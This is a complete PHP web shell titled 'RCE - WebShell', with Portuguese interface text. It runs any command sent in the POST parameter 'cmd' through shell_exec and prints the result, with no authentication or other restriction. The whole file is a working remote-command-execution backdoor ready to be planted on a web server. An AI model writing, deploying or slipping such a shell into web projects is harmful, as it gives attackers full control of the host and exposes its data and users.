<?php
    if(! empty($_POST['cmd'])) {
        $cmd = shell_exec($_POST['cmd']);
    }
?>

<!DOCTYPE html>
<html lang="pt_BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RCE - WebShell</title>
</head>
<body>

    <?php if($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
        <?php if( isset($cmd) ): ?>
            <?= htmlspecialchars( $cmd, ENT_QUOTES, 'UTF-8' ) ?>
        <?php else: ?>
            Nenhum resultado encontrado
        <?php endif; ?>
    <?php endif; ?>

</body>
</html>